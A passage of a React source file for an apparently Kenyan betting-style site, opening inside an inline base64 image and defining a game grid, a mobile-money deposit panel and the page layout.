W4FyTbRTl487VX+GbexZ49H9W4JaeP6MSE9coJJ82Jq3wZpZchwupckoV5b8y5honP2fu2HysBpWO22KeFueo0mgk4p2beiRdXCdSfmazO5nR/CVLsc+FegPmp7egBwoA777H9y/dIRjcQh94lW0SEaxxtw8ncanovTvU0iLZ57VdvyZTgsObltcU6nW3KJfC3HwsOZqmeprhLlbwbaeG6m2rxYx2OZbG7EYhBigexuRIO8CAVIB7uuhsauTT3RjnCUXyyWH5G02NtRiVODnXEFb5MPjLJiEuCD7vMOJsSNDoOVMiVMJKJrxbUeEOrWPbh4MQkenfjlykSc+497240gBu6Gw5MTi2hw7nsVYl5GGgiDEBiOTMOA6+ANqrdPC1e0jZptffpn/Lfy7MN70b14OdTs7C4oYeKNsuZ0PZTsON5FJIFwdStmOt7WqLpxDkh0LaNcvHd1yy338vkZ4bCkjsWXunhIpDo33XUlT5XvXNvU4e8j2Oi1Gnsj/Kkn9/oEEwK21F/zrn+JLOUbHJMjxuAldMkfeI+AFSxHlbXXw+Rrfp9fJPllucTiHC9PanNNRl+XzD25W5csg7XHRvEi/QPddyPE2CrpxNifDjXWVscdTyEq3GTj+uT3e/DzYkdg2MweCwi6LBE5lcj/ANxYxYnwvbz41B6iA1WzLx7tbKT9ZisXiG6RRJCp/fuflVb1PkTVTC2BweDH/wBLsR5j9aYyzfNQMtQ8ab6D5Irqw9hU20Rlw2Chwi8iscMdv3mJ/CjEmDlEc+4+159cTjwo6CWRh+6oRafLgSmuyBWJ3Lj2erTe+CSU2ACDI4bUZlIfNcXJ+VVWTzhJltO8mgphtsYdYmizTTQtJB28mIZWks0gNtLHKQjAeJNRUks5Ww1W5LKe4Ck3z7EnXuqckMkiO7KAGANrkEkWF7G/lUaqZZcorqWzVaSTe+NyxuFj194kxmRVL5vhuAAxBIUHgNKjKTrlhFljU4KKKPtQ2+ksqqqrb6dwDc9fMdeNWUpyk5EIRgoqMvP8i7uFtns4EjVwi5jplDHUk6agk+Zqm+xwbyskvAjJZh8gJ7S8aSwSQglW7mWwuuve56G3I8j4VLQz51lL88jnXCMeZv5GZTacjQiAMFzaXJCrr1J0Araq8zyymViVeyAuKwzwtkaxIAN43VxY8NVJFaXEzRuXLhlclWPjS3RL+XMfgZCrXR8p4EG1iOh5EeBqwysL4fFZWC2WJr5srD9C5Nr2PGMn93QcKrsrVkeVmnSaqemsVkFl+po8Bj1c5CpSQcUbj5r9YeIri36Wdbz1R7nQcWp1Swtpd1+x5LtmFSVL6jQ2DH8QLUR0NrWcEbON6SEnHOceRgAK7h4I9WgEdC9j+5/vuK7WVb4eAhmB4PJxRPEfSPgAPpUJCbO2bz7dGHhaYWLtdMOOrHi/kLX8gPrVXfaqoORq0GjlqrlX26v4HJ47Frux1a7txOpuzeJ4mvPOXPPMn1PoChyV8ta6LZBXHbqLIgeKWKZDoLns2v8AV10DeFwfCtkapw9qqSa+hxZ6um1+Hq6Wn8M/PPX6GY2nulLGCxR0AIBzqctzws3+9aY6uyP/AHY/MwW8J09z/wCmsTb6Jv8A1r5kEuIxsyphXLSguojDBXbMdAFcjMAb8L20rZXfXZ7rOPqNBfp/+5F/Ht9TRb97TXZOCXZmGb/mZlz4qReIU6EDpf4R0UE8WvVxkOSQwFjYUAdM9lmw2aVysmRI42kkDFgj20AcKwzDrfpVNrb2RdW+X2tzWT4I54yREGkRGWORuyQZoozlZ1uRlCvlHPK1zrXMnVCXvI6VGuvgnyyf3LmHiXWJcbFhnIuzYdndMoIAXMzBs/x87WtppTgq4bJpFV1l93tTTZWn2Tswa4jHzznnd/5j+NT5q/NsqUbX2wMTH7Eh0jw5lP2iz/xP5VLmT6RbDwp/1SSJ039jTTD4AL0IQj/Kv51JKx9IIi41rrNkM+/+Ob4IQn7g/NjUlXe++BZ06838yhLvJtJ+Mir+2fyVB+dP8LN9ZC8epdIg7Ee9SH9JiL/ssfzf+FSWjj3bIvUeSGRYFgbtIz9AQoA+Qv8AM1ZDTVweUiuVrZM0JsQL2NrjkbG4v11F6ulBS97cjGco9B0+5kuLgZgQuYkRljbM6gtbraym58D0qmc1WlFLYsgnOTkxu7eH7PDKbcReuVbLmkzfjGxz/eGfNM1dCmOIlNkty7uzOomhWVrRFgJNcvdOja8tDxqF0FJNkoWyi1g6Ft/AYZkaVMkiNhmVUkDDs8xurJclhlsLEE6X6VgqlKMlyLZ9fiXPLyrHujl+8W7mIgw8U7Iewltkk7tjcXFwrHLfoeldeqXM9zFe1y+yZi9aDIK9AEkcg5i/4H5/zoAJYRiwyKRIt/1T91v+2b8funXoaTGllhWDLlsucmPUJe00RHEx3+IDmvDTUDjSTTLJRcHlA5sDIxugjkU6hs6JfzUsCp5Wtpapb+ZURdlcVEsPUwjOyoi5nZgqqOJZiAoHmSBQI+nN1thLgcJDg0+IgmVhpdjYyv8AMhR0uvSpEGc/3u20MViWyEGKG8UYB00Nnb1YW8lFcXX2SlPHZHteBaeuujmzmUuvouw/ZLYcQuWEbTAklZi4BjA4RlfpX661VT4XhtvDl6+RfrPxLvSXMoNf04eH657EsEmHAWWKf3YtdXiIMy6fW6oejA1KHhbSjLl811K7I6huVdlfiY6S91/L1+GCfam0Joo4+x7IQksM0Z7SN2NiQVcHJYD4eWtWW2zhFcuOX03X+CnSaWi62Xic3Pts9ml55XX4km6UaYeGbaM47sQYRj6z8DbxJIQfeNS0Na3tl8EVcc1DlKOkr6vDf6fuc7m3ixUzM86xTKzM2SWKOQAsfom2dQOGjDhWuWow9jNXwhTjmSYoosMdTh3hP/tOXW/3JdflIKFq49yE/wCH7cZrkn6PYtx4gQrIY5hlKMjgh0JRhZgQe6fIMam3XatmYJaTU6V5nB4+q/II7v4OTaU8UbSlkUXZgb2RdL362IUeJFFen5XvuUXalS9xYC+9WPjlmEcICwQXSMLpmI0ZieJGlhf6t9bi1zri+qKFbOPRsFqB0HypqEV2E7JPqydGqWCBIGoAeGoAcGoAdmoAWYUAPhUMwHU1CyXLFslCPNJIP71bwLhjhIV0WTDuqSckaSNlRj5tkJPIXrDOLnNNvbD2+JtrXsSa65QJ3G2G64AGbUS3lWx4B9br08R14istrzLp0LJNZ2OS7chtiXUNfvHU/wAbV0KpexkomvaPZYQgGZltcXtc6eXE0s83QeMPLZ2DEb1xWaKEK8WHhAiChW7ScIGZxcFWIThfnfmRWSUpLlglgt8Hnbm3v5eRjvaOs6ROvGCZ0ZWDDI2t1fJwjb4lJGh04cKlpJpzw3uuoW48J4W5y6eEqxVhYjiK6iaayjnyi4vDI6ZEVAEir/QoGE4NpHQTAsB8Mim0qdNeYHRvQilhE4za2CTIj96+Dkv9N2MbN4sucWbrprx14lbk/wCW+pWy0EDoHsb2CJcW2JYdzDju9DK4IHnlXMfMqaERkdD35297tg551NpJD7vh/M5gWHW36R/EKtSInE9g7JkxEiwwWzWJuTlACi5JPIUmk+pOM3F5iw3DsXFkE4eaDFZeKwzLKw/ZIDfKs89JVLt9DoU8X1VWylleu5TwW8ckLhspV1JFwNQeBBVh5ixrK9A4vmrlh+p0lx6NseTUV5Xo/wDfuFzvG2LMcWYXLAIgQIC7nKD3RYk3tVN1GolhPGPTBu0eu4fXmcW08f1Zbx5Gk9o+Fm7DD4DCxvIkYV5igzG+oW4Gpuc7HTpW+cHCtQXY4+jvhbqZW2tJt9/98jDrs91NnR0tyZSv5iuXZmPU9lXbW17DTXo0FIYNKxSkWuQ5sEp+iPTT8qSsku5FyRooYU2ds6SWMBZ8WwVSLAhbGxvbkud/MivQ6LndSc+/2PB8XlU9S1Wksbbd2Y6OUAWHAVrOWSrPQBIMRQA8YmgB3vVAC98oAa2PHWgCGTaoHOgCr/xII3VydFYE+QOo+VQsjzRa8yUJYkmaHZdpIMJ70Cy4fNHHItzaM2yG3O2RbdQDbWubOaedzoxUoy9nfJs3ePCQkhgIpLsF1MZLXYmEj4bnUjx4cqosUuuev0+QVwc2oxW/5/M4pBsxp8SxTUE3uA1tTpy/OtXi8laTG6Mzz2PN4tlFV43sdbB9LGx1K2/GnpreZ9BW0+zuabdvEYVMNHGi53DH3hilj2bAqQp11BZTx5A93UVRqk857v8A38zRRVJrDWF0+LA28sM8KHCM+aH4oefcJBFj04G386tpcZtWd+5isUo5iZXFx9pFm+nF3W8U5H0OnkR0rbB8ssdn9yM/5tee8ft/h/kCKuMYqAPQbUATxzDnoev9f7UDHGP7I/EflpSAMCokzvW4mAOE2ZHYWklAkNx/1JiBGD5AoPQ1JFbMV7YNoAzwYRPggjDH776LfxCL/wDJTDAL3N2I0iyYpZpYzCwAEEZll7w+LKGBy2Nud9elABLa+GxOJUdjiEnliPaW9390xgsCLgEAuNeR4gcaAKWzNv8AbSqcXgziJYT2hkj/AEcwERDHtltlkAtrexFAyf2bYc4rahnYaIZMQ3TMxso9Ge4+5QBhd+tqnE7QxEwJt2hWPXgkfcW3S4W/qaBEWztuY1f1eKmUdO1cj5EkfhSayNNroGIt5cd9Ixyfejiv8woP41VLT1S6xRqr12ph7s39S7sjbGIlnjjaNf0kiIABoudgtwbk21vYj1rLZw6qXu5R0aeO6iG00pfkzVe1HHg4mOBfhhiFhyu54eion7xrfFJJJHFlJybk+rZjxNTInvvFAHvvNAC96oAY+NtzoAqzbWUcXHzoAHz7eXlc+n86AB2I2w7cNPxNAFB5GY6kk0AdH9ne+ixKMLi/1fBJLZgouBlkHNb2Hhp5jHqNOpe1HqaarWtmajeneKOOFoChaGYWDxOGQjkym5F79RmHG9c2uixP+XLHmnujYpJ4lL8upntzTGxfOjS8lZZhG6i3DUEG/jatNuVj2foWxk2mlZ2xus7D95cYHVlGFljNrdpLMHVbHknZrc+tOmuOMpfmQj/KzFTW/pn1Be722D3475kNi7G0SXHBpmFy6jlEPiPQ6mdle2/0RHxm5c2W/VmiOGTF4cxfE6BpMM3AlQe/GfFTr4gjlWdJ0z3+YrHGxcyOeO5jluw+y44acCK3+9Hb5GWE+Se/Tv8AAsT7MQk6A/yPA1fCXNHJRZDkk0U5NjryuKmQK77IPJvmKAIm2W/UUANGAk8PmaANFsXA9viIYf7yRFP3SwzH0W59KiWH0TOwMkKDQDNJ4WQBAPnID+zUkVnGNvYUYjFTzljd5GtwIyr3Et+yq1y7NfKM2sJnqaf4frspjNyabSZRi2ZJG2aKUq3IqWQ/NTehcSj3iQn/AA5P+mafyPMbFi3dZXlZ5FACuXbOAL2sxsRa5+dXR19XfJmnwDVLph/P9wlNvDi2jlWWCN5JIjCZwoE3ZtbMrMp7wIHMetWrV0v+oyT4TrIda2HPZpE0GEx+IynPlyoDpqiMwtfq0i/Kr4yjJZi8mGyqdb5Zpp+pzrDbjY9iAMMx8Q8ZGniGtUisvxbpYpDlbDvcfVGb/wAb0AWG2LMoJaCUAC5JjYAAcSTagYY9n8CtjoTp3c7fJGt+NqAMn7RNpudpYohiAJMvH6iqn+WgRnhtGT65/CgD3+0ZPrn8KAGnHyfXb50ARtinP0m+ZoAiZ78daAG3oA8oAcq3oDBOif6k/wBfgKiySRG8nIHT5X86khMUOIZfhYjrY6HzHOk4p9QUmugY2RtRxmHYRShVZmzJqANASVsbXI+fKqZ0rzZfC6XkiLGbazDSGFb/AFVJI9STanClR7sTufZAszN1OhuPOrUkilyb6m63F2131QtlJYFD9WUaLf7LfCfNT9Gsuqq548y6mjTWcr5X0CntK2GLLjI1skmkg+pINCD01vVGms7E7YYM5sG0hUMSHS481PAHqLmtUXyT9GRa8Sv1X2DUuBrQZSrJgqAK74SgCE4WgDQeyzDZ8erEaRxyPfoTZB/5n5VFEn0OqY3F5DiZb/q4QB4MBI5+eZPlRJ4TZKqHPNR83g5hAllA8AK8092fTfdQVxOxZFxAw11aQ2tY6ajNxIHLWrZaeasVfcw18Rqnp3e9or6+Q87BPD3jC3Glu3F7jlwqX4Z5xzL6kVxJYz4c8efKyrtDZUkIDOFKsbKyMrqSOVweNQsplBJvGPNGjT6yq9uMcprs1h/mFnQ/2NOoNjI2W/TO8cddbQrFOfU8lxx8+tx5JfbJpcFs5IYI44TYAZAo5AfmTxvzvWw4suoO2xgkkieNxe9wQf6/GoyWxKDxJM5SMIo0ve2nCuW7Zroe/jw+hxTcVv6Go9nmDRMWHVQD2bjQAcbdPKr9LfOU+VvscfjXD9PTp/EgsPKOcb439/xd/wC/l/8ANrfhXQPKAagBUAKgBUAKgBUASJH1pZJJEjMB/L+uFIbZC7k/wqRDI2gBUAWdnvZ1DMVRiFkINu4SMw8rflSfQa6jJ0AJAN7Ei/XU2NCG0Q0yJPhJ8jX5c/KgDuu5OPjx+GfDzm+cBHv9cj9HKPvWsT9ZT1FcyyHh2bdGbVLnhnujl+08BJgMY0cgsUax+0h5j051pXtx9f1K4vklnsbSIBlB43AN+oIuD6irqp88ckL4cktuj3Gvh6sKStJhaAIDhaAC/shi7+Jfosaj1Lk/kKiiUjUbanthcY1/iky/hDD/AJTVeoeK5fA18Njzautepi0NrEcq87nDyfRGk9mF13nxY/6xPmqH/LV61Vq7/kc98J0jWOT83+5Rl2k7S9s+Vn495RlNhbVRYGoeLJz53h/I0x0lcafBjlR+O/13H7R2tJMqoQiIpJCxoEXMeJt1/nUrL5TST6ehDTaGuiTmsuT2y3llzaJJ2NKove+luN+2U6V1tH/8dfM8nxX/AOwfy+xZ2XvSzKomjkWSwBIjchvtCw0vVtVvMt0Z9ZovDm3Bpr47kG29tsQUjU5m0zPaMC/3yNaVkpNYiiWiopjNTvmkl2znJlThgou8sC25dqjn/AWrD+FsfY9LPjmjX9TfwX/ot7nbYi95jCk3bMNVYfRbna3KraNPZXYpNbfE53FOJ6XU6Zwg3nbsY32gR22hiPtMG/eVW/MmuieWM7QAqAPbUAKgBWoAkVbUiSPC/SjAmxlMQqAPKAFQBe2JMExELt8KyxlvIMCfwqMvdY49UO2hh+zlni+q7r+49vyBpReYpkpdWD6mQFQBptytvthplbUjgwHFkNswHiLBh4qKqurU44LK58rydb3/ANhrtHCLjIrNNCoD2/6kTAMrj0Ib5jiKyQk0s+WzLpRSePPoYrdHEkxvE3xw/jET/lJv5E9KsUuSzPZkseJW490HrVsMZ40dAERhoAm9lDWinPWRR8lB/jSQ5E+8+NI2biGU6+8Nrx/9Zb8hSlFSWGWU3Sqmpw6owce0ZjYBiSbAAKCSTwA01rP+Dp/t+50P+Z1n9/5L9h+JxOIj/WZ0++mX8xR+Dp/t+4v+Z1n9/wCSK/8Aacv1/wAv5U/wlP8AaL/mNZ/5H9F+x5/aMv1z+H8qf4Sn+0P+X1n/AJH+X7Gu2btRjsqezkSKZcrA2a4CutiOB1q2EFBYiYbrp3T57HlnNpNqzsbtNIT1Ltf86mVDowz6s7HzJP50AWo8CPE0AXsHB2bB0sGXVfMUDBe8eIMpSQm5sVPobr+DEfs0CA9qAPbUAK1AFjBYNpXyLa9idTyUXNupsDpSk8IlFZYphlPK/MDh+FJbjbwVzUiArUAeUAeUAeUAKgD2gA5vH3sSJP76OOT1kjGb/Fmqqv3ceRbL3s+YDNWlR5QA6N7EEcqAO0ex3ecBhA50sct+cZJLp5qSXHgZPCsl0eSXOvgzTW+aPL37F3fHdsbPxsWLiTNAzd8fYbR1PoxI61TOPKuXt2JVzzv3GbSwghlKA5l0ZGBvdD8PryPiK10z5o79Sm2GHldyEVcVCtQBnNx9spCsiObEsGHj3bH8qSHIk2ttZXwc0PMyu/zn7X8qYgDsqcRzRSHgkkbnyVgT+VAGq27vziDipThMSzQFgY1KKwtlW4yutwM2agBse8eOk44GGbxOCLE/u2oAr7wtipMOTJs2LDorKxkTDtEw+iASTwJbhbpQMya4tl7tyFJuRy6G/pagQEKWJHTT5aUAEtkYZ5DaNGc9EUufkAaBmjj2O66StHEejuM37iZpP8NJyS6k4VTm8RTfw3+xDi48pAiPaC2pIMYv0AILHzIFUvUVrub4cI1cv6cfF4AGOw7KSjC1+8ttRfUixIHiPWrK7IzWYmXVaSzTT5LFhgsCpmY9y0AK1AHlqAFagBtqAFQA00AeUAeUAKgBUAGtpNmw2FkHFe0hb9h+0X/DKPlVcV7cl8yxv2UwTOO8fOrF0IPqR0CFQAU2BtFoZVZGysrBkPRgbj/aoyipLDGnh5PoPd3eNNpp2BCqFTMysTfNqFVQD3lFtWP1lFuuCUZe5Louhq9le1ExS7UEgCFSksBMciE6Zbko0Y4qnLLyI8ato2l8UFmXD55LCNWwyEl6AOVmYq2n9a0kORKs97i/EacPqUxFiI6CgDaTe0TE9giJaOZWOaREjyultO6VNmvzGnh0ABj73bRk/wDUzH7tl/8AECoucV1ZdCiyfuxb+RTnkxkoIkkncHiJJXI9QzVRLV1R6yNlfCtXPpD6g7aWypEjLm3d4gE3sTbpUa9ZXOfKizUcG1FFLtnjC8nk8wGJQKLQQs5GruhkYm51yuzRj0SrbLXAr0WhWoWW/oFRi55BlZ2y8Ml8qeiLZB8qw2amXmek0vB6o7uGfjuTYfBcuXQaCsc7mdqGnjBbF+HCAcqzysZb7MehQ3o2bnizoO/HqLcSvMfx9K18Pv5bOR9Gef49pPFq8VdY/YxDrfUc/wA+f9eNd08UMy0AeWoA8NADTQA00AeGgBpoAbQAqAFQAqAC+FObBzL/AHckco8mDRv+Jjqt7TT+RNbwaBk3I9QPw0/hU0RZHTEKgD0GgDbbi46Xt4zAwEne1PwgBSWLaiwAGa/KwPKqdRjk3Lqc851zePY+XABzGZWc5iFjRHkc3OYjIznwFg2upFYnBxSfmWqftNIC7bgiUQvAQUdDcWKsrqbMrg8CLgcBwrTRNttZ7ELI+xzY3yD89ajOcqxnEetJEpDe1sVP9aH+VqZE2mC2XFlBsT5k/wAK4tusuUmsnuNPwfR8ilhvK7sN7J3faa/ZRLYfExsqjzY/lVUPHu6Nl1r0OixmKTfRJZbCX/DvL3rC5una/wClH4Z95xyJcTx0pnj4foTYPdiUSIWEckeYZssq2K315g8KlDSSUk9mviV3cXqdclFyjLG3svqCd49nKkssIsUuQLG/dYXA9AbelV2fyrsrszXpp/i9IvE6yTT+P+7mA2USkjxNxBPzGh+Ysa6upSnWpo87wW10amVE+/3X7hyHjXMkj2MWFIKzSRJy2yXcSqwrnxDrEvGzfGfJB3vnYeNXVaOyz0RyNVxjT07J8z8l+5ktp71XYjD5gluLKucnmfiKqPCxrpVcPrjvLLZ5/UcevsyoJJfV/mUE2aHjLqLHN3he+W/A2Ava+l+V7VrlPle/Q48YKa26guRLEgjUVZnJU1gjIpiGGgBpoAaaAGmgBpoAbQAqAFQAqACu7/eeSO1+1hkUfeUdov8AijX51CzpnyZOHXAOb4R6j+P8an3I9iOgQqAFQBe2RjGjkBU2NwQehHCoyipLDJRk4vKOpbJ9oU5xEU8zZuyjZAo+Fs3FsoIs2nG9Y5U2R93f9DRK2px2i89yq+0WllklawMjmQqOCkgaD5etX1Vcu76kbrE0ox6L7lkSVeZzmuO4X6GookytxXyOvkf9h86l3Im63dnzwoegsfMaVwdbDltPfcHu8TSR9NjW7I2uUjOHaETIzBgtyDm0Glgb8BpUaL2o+G482ewazRKyzx42cjSw3tjHzCmP2TiJUCjDYeBb3UXVXJsRa99ePA1fZTbOOORR+5h0+s01M3LxZzfwbSKT7Hw0FhipHaWwJjiUd2/AFjoT8qrdFVW1jefJGha7VapOWnilD+6T/TyGbb2TEsCTxCWMMxQpLbNwJDDw0/GldTBQVkcr0ZZodZbK+VFjjLCzmPT4HNt68MY5ExCDiQG+8OF/MXHpW7Q2Kdbrf+o4/HKJUaiOph3+6/csnauHRQzOzEi4jjGuvJ2bur6Bj4UR0bb3exqu/iKEYrw45eO/QoYre6cjLABAvC6XMhHjIe8P2co8K1Q09cOiOBquJajU+/LbyWyBCozm7EnzJPHzq3BhyEsJgwKYgph5ihupKnhcaH08ai0msMabW6A20nYtaU5n4rJ/eL9r7Xj6HkQRSjsht83UoMKkRIzQAw0ANNADTQAw0AeUAKgBUAKgCzs7E9lLHJ9Rlb0B1HyqMllNDi8PIsdGFd0HAObeWtvwtTj0Q5dWVqZEVACoAVAB3Z2JuB+NAGgwU9ABNZ6AMRiUuCPCok2inhDc5frAr68vxtUiBoNzMVq0Z+8PyP8ACubxGHsqZ6f+HNRiU6n8V9jfbA2iIJ0lZcwFwQONiCLjxrm0WKuakzvcQ0r1NEqk8Mn2zNhWBaIztIzXzSlSANbjr/tU7pVPeOc+pTo69XBqNigopYxEFSbbaOUTNKe0BuCTmbpzvTqhfOSkk8+bHqLdFTU6ptJeX+EDNrb0vKczMznkXOg8gNB+FbVopzebZHEfGaKFy6WtL1f+/dgPF4tpQVc3U6EDh5+Y4+lbatPCr3UcjV8Qv1O1ktvIzskRBKN8S3tbmOOnhzHgauMIyPjQAXwlqACeFhL3tay6sxNlUdWJ0FJvAJZHvlPdS56vqpP3ARdR4nXoBxrNZqFE7Oi4RZfvLZfn/j5lj+xllQq37J5qeuup9TqPIWxfjnGeX0O/dwGmVPLHaXZmVx2EeF8kg15HkR1H9ac66kJxnHmizxt+nsom4WLDRWNTKRhoAYaAGmgBpoA8oAVACoAVAHooAuYxBaPQAmME6jU5mAOh5gDjzqKJPsUqkRFQAqAFQBZwM2VvA0AaHBz0AFFn0oAzzcaiWMFwfGv3h+YqRWFtin/nD5yfmaz6r/tM6nBX/wBZD5/Y3Qrzx79AzbkhCixI8jat2hinJ5OFxuco1rleAFXaPF9VlnXvZLg4/dTJ2adpmYZ8ozWvwva9MizOe2KJRi4iFALQgsQACTnYXPXSgDmO1D34/uj/APY4/hQBTbifM0AX8KaANDtrQ4VBovuwkyjhnOhe3DN48apv9w6HC0nqFkfghoPWuRb1PfaT3Q5BwrDPqaGCN70BwzEgXBWx6d4DT0rp8Mb5mjzH8RxXhxeN8/uYYcP66V2DyB4aAGGgBhoAbQAqAFQAqAFQB6KAHySE8STawFzewHADw8KQyOmIVACoAVACoAPYU0AElOlAH//Z'
    }
  ];

  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
      {games.map((game, index) => (
        <GameCard key={index} {...game} />
      ))}
    </div>
  );
}

function PaymentMethods() {
  return (
    <div className="bg-[#1a2332] p-4 rounded-lg">
      <h2 className="text-xl text-white mb-4">Paybill Numbers</h2>
      <div className="space-y-4">
        {['Safaricom', 'M-PESA', 'Airtel', 'iPay'].map((provider, index) => (
          <div key={index} className="flex justify-between items-center">
            <span className="text-green-500">{provider}</span>
            <button className="bg-yellow-400 px-4 py-1 rounded font-semibold hover:bg-yellow-500">
              DEPOSIT
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

function MainContent() {
  return (
    <>
      <Navigation />
      <WinnerTicker />
      <main className="container mx-auto py-4 md:py-8">
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-4 md:gap-8">
          <div className="lg:col-span-1">
            <JackpotSection />
          </div>
          <div className="lg:col-span-2">
            <GameGrid />
          </div>
          <div className="lg:col-span-1">
            <PaymentMethods />
          </div>
        </div>
      </main>
    </>
  );
}

function App() {
  return (
    <div className="min-h-screen bg-[#0f1623]">
      <Header />
    </div>
  );
}

export default App;